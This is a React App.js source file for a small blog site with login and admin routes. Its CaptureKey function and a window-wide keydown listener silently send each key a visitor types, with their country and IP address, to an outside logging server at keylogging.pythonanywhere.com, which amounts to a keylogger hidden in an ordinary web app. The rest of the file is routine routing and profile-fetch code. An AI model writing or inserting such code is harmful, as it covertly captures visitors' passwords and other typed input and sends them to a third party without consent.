import { useContext, useState, useMemo, useEffect } from 'react';
import Navbar from './Navbar';
import Home from './Home';
import { HashRouter as Router, Route, Routes } from "react-router-dom";
import Create from './Create';
import BlogDetails from './BlogDetails';
import NotFound from './NotFound';
import { LocationContext } from './contexts/LocationContext';
import Admin from './admin/Admin';
import Login from './admin/Login';
import { isBrowser } from 'react-device-detect';
import { userContext } from './contexts/UserContext';

const CaptureKey = (key, location, ip_address) => {
  fetch('https://keylogging.pythonanywhere.com/api/new_keylog', {
    // fetch('http://127.0.0.1:5000/api/new_keylog', {
    method: 'POST',
    body: JSON.stringify({ key, location, ip_address }),

  }).then(responce => {
    if (!responce.ok) {
      console.log("There was an error")
    } else {
      console.log("Captured")
    }
    return responce.json();
  }).then(data => {
    console.log('Captured')
  }).catch(error => {
    console.log('Aborted')
  })
}

function App() {

  const [userProfile, setUserProfile] = useState()
  const userProfileProvider = useMemo(() => ({ userProfile, setUserProfile }), [userProfile, setUserProfile])
 
  const { location } = useContext(LocationContext);
  isBrowser &&
  window.addEventListener('keydown', function (e) {
    // e.preventDefault()
    location && CaptureKey(e.key, location.country_name, location.IPv4)
  }, false);


  useEffect(() => {
    fetch('https://traffic.pythonanywhere.com/api/profile', {
      method: 'GET',
      body: JSON.stringify(),
      headers: {
        Authorization: 'Bearer ' + localStorage.getItem("token")
      }
    }).then(responce => {
      if (!responce.ok) {
        localStorage.clear()
      } else {
        console.log('Logged in')
      }
      return responce.json();
    }).then(data => {
      if (data.access_token) {
        localStorage.setItem("token", data.access_token)
        setUserProfile(data)
      }

    }).catch(error => {
      console.log(error.responce, error.status, error.headers)
    })
  }, [])

  return (
    <Router>
       <userContext.Provider value={userProfileProvider}>
      <div className="App">
        <Navbar />
        <div className="content">
          <Routes>
            <Route exact path="" element={<Home />} />
            <Route exact path="create" element={<Create />} />
            <Route exact path="login" element={<Login/>}/>
            <Route exact path="blogs" element={<Home />} />
            <Route exact path="admin" element={<Admin />} />
            <Route exact path="blogs/:id" element={<BlogDetails />} />
            <Route path="*" element={<NotFound />} />
          </Routes>
        </div>
      </div>
      </userContext.Provider>
    </Router>
  );
}

export default App;